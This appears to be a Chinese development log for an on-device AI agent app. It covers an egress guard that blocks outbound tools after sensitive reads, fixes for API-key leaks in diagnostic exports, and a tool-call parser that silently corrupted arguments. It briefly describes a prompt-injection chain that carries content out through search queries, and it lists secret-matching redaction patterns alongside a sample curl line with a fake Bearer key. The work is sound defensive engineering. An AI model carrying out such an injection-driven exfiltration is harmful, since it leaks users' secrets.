| 同意与清账 | 3 | 参数原样传给弹窗；拒绝不缓存；`onTurnStart` 清账 |
| 超时上限 | 1 | 60s > 链默认 3s |

变异 M28–M34 全部 CAUGHT（新增 7 条，累计 **34 条**）：

| 变异 | 模拟的错法 |
|---|---|
| M28 | 恢复「敏感即提前返回」（= 修前行为，架空 web_open 等四条） |
| M29 | 用「当前」污染状态判外发（自己拦自己） |
| M30 | 敏感工具不标脏（整条守卫失效） |
| M31 | 忽略用户同意（永远拒绝，弹窗变摆设） |
| M32 | 新回合不清账 |
| M33 | 问人的守卫沿用链默认 3s |
| M34 | 污染后连「继续读」一起拦（过度拦截） |

M34 是刻意加的**反向**变异：只防「拦不住」的断言，会让实现越来越保守，
最后变成「什么都拦」。保守是最容易被当成正确的错法。

### 12.6 变异门禁自己的两个洞（都是「报告在撒谎」）

**① 基线红 = 全量假 CAUGHT。** 原来没有基线步骤：一条编译通过、跑起来就红的断言，
会让**每一条**变异都显示 CAUGHT。门禁打出「34/34 全部被捕获」，而结论是假的。
现在先跑三个组的未变异基线，任一组红就 `exit 1` 并打印红了哪几条。

**② JUnit 全绿时没有 `Tests run:` 行。** `parse_failures` 只认 `Tests run: N, Failures: F`，
而 JUnitCore 全绿时打的是 `OK (94 tests)`。于是**变异存活**被报成
`INVALID: JUnit 没有输出 Tests run 行`——结论同样是失败，但理由指向「测试没跑起来」，
看报告的人会去修环境，而真相是「测试跑了、全绿、没人抓到」。现在两种格式都认。
（这个洞让第一次全量跑的 34 条里有 1 条 M28 报 INVALID，查下去才发现是变异定义跨了注释行；
两个问题都不是「红」，而是「红的理由说错了」。）

### 12.7 顺带：harness 补 D8，覆盖整个外发集合

`AgentSeamsVerification.kt` 新增 D8：遍历 `DEFAULT_EGRESS_TOOLS`，逐个「先读文件再外发」，
任何一条不被 Deny 就算失败。它与 JUnit 那条重复，但**跑在不同的地方**（harness 在
每个装了 kotlinc 的环境都跑，JUnit 要 AGP 产物之外的 Gradle 路径），且都只要十行。

`run-agent-seams` 现在 50/0（原 49/0）。

### 12.8 仍然没做 / 已知边界

| 事项 | 现状 | 为什么没做 |
|---|---|---|
| `web_search` 不标脏 | 有意为之 | 搜索结果是外部内容，标脏最「正确」；但「搜一次 → 搜第二次」就会弹窗，研究型回合要点十几次，用户必然无脑点允许——重复确认比不确认更危险。残余链条（搜索结果里的注入 → 再用 `web_search` 把内容拼进 query）**已知且接受** |

### 12.9 CI 上一跑就红：`curl` 少了 `-f`，错误页冒充 jar

推上去的第一版在 CI 上 51 秒红，报的是：

```
基线编译失败（approval 组）—— 什么都没验证：
core/src/main/java/com/beichen/polaris/core/AgentContract.kt:3:16: error: unresolved reference: serialization
```

这条报错把人指向「源码里 serialization 的 import 写错了」，而真相在**上一步**：
`curl -sSL -o xxx.jar` 没有 `-f`，HTTP 429/502 的错误页被原样写进 `.jar`。
文件在、路径对、大小不是 0，`isfile` 一路放行，直到编译器说「这个包不存在」。

三处一起改，原则都是**别让失败长得像别的东西**：

| 位置 | 改法 |
|---|---|
| CI 下载步骤 | `curl -fsSL --retry 5 --retry-all-errors`；下完再用 `zipfile.is_zipfile` 逐个验，坏的直接列名字+大小+开头字节 |
| `find_classpath` | 候选 jar 先过 `is_zipfile`，不合格的记进 `_BROKEN_JARS`，由「缺少构件」那段点名输出（跳过它但说出原因） |
| 每轮输出 | 打一行 `构件：kotlin-compiler.jar(56MB) …`，跨版本串档 / 少一个 jar 一眼可见 |

顺带把 CI step 名字从「变异门禁（27 条）」改成「变异门禁（基线 + 全量变异）」——
条数只增不减，写死在名字里必然过期（上一版就写着 27，实际已经 34）。

> 这一条与 12.6 是同一类：**两种失败都会「报红」，但报红的理由指错方向**。
> 报错指向哪里，决定了修它要多久；指向源码的假线索，比一句「不知道」更费时间。

## 13. 第十一轮（2026-11-19）：诊断包把 API Key 原样发出去

第十轮结束时我留了一句「下一步：把行为断言覆盖率当指标推，150 个 runner 里只有 22 个有行为段」。
这一轮按这条走了第一步：**在 core 里找「零引用」的类**（209 个顶层声明，83 个没被任何测试
或 harness 提到），挑价值最高的那个补断言。

`DiagnosticsExporter` 在名单里，理由很直接：它是**用户主动把文件发出去**的那条通道——
贴 issue、发群里、给开发者。它同时带走设备信息、配置（含 Key）、日志与回合流水。

### 13.1 四条泄露路径，其中三条在同一个文件里

| # | 位置 | 问题 |
|---|---|---|
| 1 | `traceOf()` | 把 `turns-*.ndjson` **原样 `copyTo`** 进诊断包。而流水的 `tool.start` 行带 `"args"`，`RealAgentLoop` 传的是 `call.arguments.toString().take(120)`——**原始参数**的前 120 字符 |
| 2 | `export()` 配置区 | `appendLine("端点：" + config.baseUrl)` 没过脱敏。用户把 Key 塞在自建代理的 query 里（`?key=…`）时，它照样写进文件 |
| 3 | `crashSnapshot()` | `native-stderr.txt` 由推理库自己写，我们决定不了内容（下载地址、代理、鉴权头回显都出现过），却原样拼接 |
| 4 | `export()` 的 Key 替换 | `listOf(主) + 备用` 的顺序逐个 `replace`。主 Key 若是某把备用 Key 的**前缀**，先替换短的会让长 Key 剩尾部明文 |

第 1 条最要命，因为 120 字符足够装下一整条：

```
{"command":"curl -H 'Authorization: Bearer sk-abcdefghijklmnopqrstuvwxyz0123456789' https://api.x.com"}
```

而 `traceOf` 的 KDoc 当时写的是：

> 不含任何脱敏负担：`RunEventJson` 只编码 seq/at/turn/scope/type/step/call/status，
> **不落工具入参与输出**，因此不存在「事件里夹了 Key」的可能。

这段话把两个函数混成了一个：`ndjsonOf()` 导出的才是 `RunEvent`（确实只有
seq/at/turn/scope/type/step/call/status），`traceOf()` 导出的是 `TurnEvent`——两者都叫
「回合事件」，字段族毫无重叠。注释读起来天衣无缝，代码里少了一道闸。

这与第十轮的 `EgressGuard`（注释写着「比 web_search 更静默」，四条通道从未生效）是**同一种病**：
**注释描述了一个不存在的行为，而读代码的人不会怀疑它。**

### 13.2 为什么没有断言

`DiagnosticsExporter` import 了 `android.content.Context` / `Build` / `FileProvider`。
JVM 上编不过 → 进不了 `core/src/test`，也进不了任何一个 kotlinc harness。
整个仓库对它的检查只有 `run-log-user-content-verification.sh` 的 W7 一条 grep：

```bash
grep -q 'safeLog = safeLog.replace(k, maskKey(k))' "$DIAG"
```

它盯的是**那行代码**，不是「Key 有没有被替换」这个行为。所以：

- 判据对不对，没人知道（`maskKey` 的 8 位边界对不对、顺序对不对、兜底有没有）；
- 新增的两条通道（端点、崩溃现场）没人管；
- 流水那条通道更没人管——因为它压根不在这个文件里，它只是被 `copyTo` 搬了一下。

### 13.3 证据：用旧实现复现前缀残留

```python
short, long = "sk-AAAABBBB", "sk-AAAABBBBCCCCDDDD"   # 主 Key 是备用 Key 的前缀
out = "key=" + long
for k in [short, long]:          # 旧顺序：主在前
    out = out.replace(k, mask(k))
# key=sk-A****BBBBCCCCDDDD      ← 尾部 12 位明文留在诊断包里
```

完整长 Key 已经不在，所以任何「不含整把 Key」的断言**都会假绿**。判据必须是
「长 Key 的独有后缀也不在」，测试与 M35 都盯着这一点。

### 13.4 修法：判据搬家，出口统一

新文件 `core/.../DiagnosticsRedaction.kt`，纯 Kotlin、零 Android 依赖：

| 函数 | 职责 |
|---|---|
| `maskKey` | 前 4 + `****` + 后 4；**8 位及以下整体抹掉**（`<=` 与 `<` 差一位就全泄露） |
| `secretsOf` | 主 Key + 备用池，去空白、去短值、去重，**按长度降序** |
| `redact` | 先替换已知 Key（长→短），再按**形状**兜底（`sk-` / `ghp_` / `AKIA` / `Bearer` / `"api_key":"…"` / `?token=`） |
| `redactLines` | 逐行版，给文件导出用 |

`DiagnosticsExporter` 退化成接线：四条路径全部经过 `redact` / `redactLines`。

两处细节：

- **顺序**：日志先按行截断（`takeLast(300)`）再脱敏。按行截断不会把一把 Key 切成两半，
  而先前脱敏全文要给几 MB 日志多复制一份，且这一步在 UI 线程上。
- **形状兜底**：只替换「配置里那两三把」等于只防住了自己知道的那部分泄露。
  兜底模式只认**高熵形状**，不认来源——`[A-Za-z0-9]{8,}` 这种宽规则绝不能加，
  它会抹掉 UUID、时间戳、文件哈希，诊断包直接失去排障价值。

### 13.5 断言 26 条与变异 8 条

`DiagnosticsRedactionTest`（新建 `redaction` 组，基线 26 条）：

| 组 | 条数 | 要点 |
|---|---|---|
| maskKey 边界 | 4 | 空 / 8 位 / 9 位 / 首尾空白 |
| 汇集与排序 | 4 | 短值过滤、去重、**降序**（M35 的靶子） |
| 替换 | 3 | **前缀残留**、多次出现、无 Key 时原样 |
| 形状兜底 | 6 | OpenAI / GitHub / AWS / JSON 字段 / URL query / `--token` |
| 不误伤 | 4 | UUID、时间戳、普通 URL、普通 JSON、含 token 字样的句子 |
| 幂等 | 1 | 二次脱敏不变 |
| 端到端 | 3 | 真实 `toNdjson()` 的 `tool.start` 行、多行、空行 |

变异 M35–M42 全部 CAUGHT（累计 **42 条**）：

| 变异 | 模拟的错法 |
|---|---|
| M35 | 不按长度降序（= 修前行为，漏尾巴） |
| M36 | 去掉形状兜底（只认配置里那几把） |
| M37 | 8 位 Key 不整体抹（`<=` 写成 `<`） |
| M38 | 不 trim |
| M39 | 短值也当凭据（「short」这种普通词一起抹） |
| M40 | 只替换第一次出现 |
| M41 | JSON 字段连名一起抹 |
| M42 | 形状放宽到任何 8 位字母数字（**过度脱敏**） |

M42 是反向变异，理由与第十轮的 M34 相同：只防「抹不干净」会让实现越来越宽，
最后把诊断包抹成一片星号——排障时最需要的恰是参数。**过度脱敏与不脱敏一样，
让这件工具失去意义。**

### 13.6 顺带：一条 grep 断言在判据搬家时报红了

`run-log-user-content-verification.sh` 的 W7 守的是「诊断导出对日志做 Key 替换」，
但它 grep 的是实现行 `safeLog = safeLog.replace(k, maskKey(k))`。判据一搬走，它立刻红——
而语义其实还在，而且更强了。

改法不是删掉它，而是把它指向**新接线**，并在注释里写下这次的教训：

> grep 型断言守的是「那行代码」，不是「那个行为」。判据重构时它会误报，
> 判据退化时它却未必报——因为它不知道自己在守什么。

这与第十轮 `EgressGuard` 的 D1–D7 是同一枚硬币的两面：那一次是**有行为断言但只覆盖五分之一**，
这一次是**有断言但盯错了对象**。两者都会给出一份看起来可信的报告。

### 13.7 仍然没做 / 已知边界

| 事项 | 现状 | 为什么 |

## 14. 第十二轮（2026-11-19）：解析器认出了工具名，参数是空的

上一轮结尾留了一句「零引用类名单里还有 82 个」，这一轮按名单挑了下一个人：
`LocalToolCallParser`（360 行，`core/llm/local/`）。

挑它的理由不是「行数多」，而是它的位置：**模型说的话与我们要执行的动作之间，
只有这一道转换**。它解析错一个字符，下游执行的就是另一个动作，而且不报错。

### 14.1 三个缺陷，共同点是「看起来成功了」

写断言时先跑了一遍修复前的实现，11 条红。但红的方式分两类，区别很重要：

| 失败方式 | 后果 | 有多难发现 |
|---|---|---|
| 抛异常 / 返回 null | 上层看到「解析失败」，静默重试一次 | 日志里有一行 |
| **返回了一个错的结果** | 直接执行 | **没有日志，因为没出错** |

三个缺陷全在第二类。

#### ① OpenAI 的 `function` 形态丢参数

```json
{"function":{"name":"read_file","arguments":{"path":"a.txt"}}}
```

`nameOf` 认出了 `read_file`——它的 KDoc 甚至写着「`function` 键有两种形态，两种都认」。
但 `argsOf(obj, "function")` 只在**顶层**找 `arguments`，而它在 `function` 对象里。
找不到就落到平铺兜底：`obj.filterKeys { it != "function" }` = `{}`。

于是 `Result(name="read_file", args={}, error=null)`，`ok == true`。
`parseAssistant` 构造 `ToolCall("read_file", {})` 并执行：

- `read_file` → 没有路径；
- `write_file` → **用空内容覆盖**；
- 而且**不会触发静默重试**——从 `Result` 的角度看，一切正常。

3B 模型见过大量 OpenAI 风格的训练文本，照着写 `{"function":{…}}` 是常事。
这不是「我们自己的格式」，所以更不能靠「模型不会这么写」来兜底。

#### ② 修复阶段改的是字符串内容

`repair` 里两条修正都是全文无差别的正则：

```kotlin
t.replace(Regex("\\bTrue\\b"), "true")       // 内容里的 "True story" 变小写
t.replace(Regex(",\\s*([}\\]])"), "$1")      // 内容里的 "a,}" 变成 "a}"
```

触发条件是「同一段 JSON **在结构层也有**语法错」——一旦进 `repair`，扫描不分内外：

```
输入：{"tool":"write_file","arguments":{"content":"a,}","x":1,}}
                                            ↑ 结构层的尾逗号在这里
输出：args = {"content":"a}", "x":1}         ← 用户要写的内容少了一个逗号
```

`write_file` 把改过的内容写进文件，日志里一切正常。**这类损坏比解析失败危险得多**：
失败会被重试，损坏会被当成用户的文件。

#### ③ 解说里的一对花括号让整次调用作废

`objectIn` 只抠全文**第一个** `{…}`。模型说「我读一下 {这个} 文件」——中文里用花括号
强调是常见写法——第一个配平对象就是 `{这个}`，不是 JSON，`parseObject` 返回 null，
而候选列表里再没有第二个。整轮白跑，且报的原因是「JSON 无法修复」。

#### ④ 附带发现：`repair` 基本是死代码

原来的顺序是 `strict → lenient(原文) → repair → lenient(修复后)`。而 kotlinx 的
`isLenient` 极宽容——裸换行、尾逗号、不带引号的键它全吃。所以第二条就返回了，
`repair` 只有两种情况会被执行：lenient 也失败（结构层尾逗号在嵌套位置的某些形态），
或者干脆是死路。

代价是「必须靠 repair 才能正确」的输入被 lenient 以**错误的样子**收下：

```
输入：{tool: 'read_file', arguments: {path: 'a.txt'}}
输出：args = {"path": 'a.txt'}        ← 值里带着单引号，read_file 打不开任何文件
```

### 14.2 修复前后

用修复前的文件跑新写的 36 条断言，红 11 条：

```
1) 内容里的 逗号加右花括号 不被当成尾逗号  expected:<a[,]}> but was:<a[]}>
2) 内容里的 逗号加右方括号 不被当成尾逗号  expected:<a[,]]> but was:<a[]]>
3) 内容里的 True 不被改成小写             expected:<[T]rue story> but was:<[t]rue story>
4) function 形态要带出 arguments          expected:<a.txt> but was:<null>
5) function 形态的 arguments 是字符串时也要解 expected:<b.txt> but was:<null>
6) function 形态的参数平铺在 function 里
7) function_call 形态                     expected:<read_file> but was:<null>
8) tool_calls 数组取第一个                 expected:<read_file> but was:<null>
9) 整段用单引号定界时换成双引号              expected:<[a.txt]> but was:<['a.txt']>
10) 内容里的 None 与 False 也不被改
11) 先解释再调用时取到的是 JSON 而不是解说里的括号 expected:<read_file> but was:<null>
```

修复后 36/36 全绿。

### 14.3 四处改动

| 位置 | 改动 |
|---|---|
| `locate()` | 新结构：名字与参数**一起定位**。三种形态按「嵌套 → 数组 → 顶层」顺序试，参数永远跟着名字所在的那一层走 |
| `argsOf(Target)` | 从 `holder` 取参数；平铺兜底时剔除哪个键取决于嵌套与否（嵌套剔 `name`，顶层只剔 nameKey） |
| `replaceOutsideStrings()` | 先算「哪些字符在字符串里」，只改结构位置。四条修正全部改走它 |
| `objectsIn()` | 每个位置返回**全部**配平对象，不是第一个 |

`parseObject` 的顺序也调了：`strict → repair → strict/lenient(fixed) → lenient(原文)`。
修复是字符串感知的，先修再解才安全。

一个细节：`stringMask` 把**定界引号本身**标成「字符串内」。它不该被当成结构符号——
`"a,}"` 里的 `"` 如果算结构位置，尾逗号正则就会从它开始匹配。

### 14.5 顺带：变异门禁加 `--group`

调这 10 条变异时，每次都要等五个组的基线编译跑完（约 1 分钟）才能看到一条结果。
加了 `--group <组名>`，基线也只跑那一组。`parser` 组零依赖（只 import
`kotlinx.serialization`），编 360 行不到一秒，单组 10 条变异 69 秒跑完。

不加这句，一份片面的报告会被读成全量结论，与前几轮「报告在撒谎」是同一类问题。

### 14.6 仍然没做 / 已知边界

| 事项 | 现状 | 为什么 |
|---|---|---|
| 单引号定界 + 内容里有双引号 | 解析失败（有断言钉住「失败」而非「给错值」） | `{'content': 'say "hi"'}` 无法在替换前判断哪个引号是定界符；猜错就是改内容 |
| 多个工具调用 | 只取第一个 | 本地模型的单轮调用几乎都是单个；取多个要改 `AssistantMessage` 的形态，属于另一个改动 |
| `arguments` 是数组 | 不认 | 参数按定义是对象；数组形态没有明确的键 |
| 真机上的实际解析率 | 未测 | 需要真机日志统计「解析失败 → 重试 → 成功/失败」三段比例 |
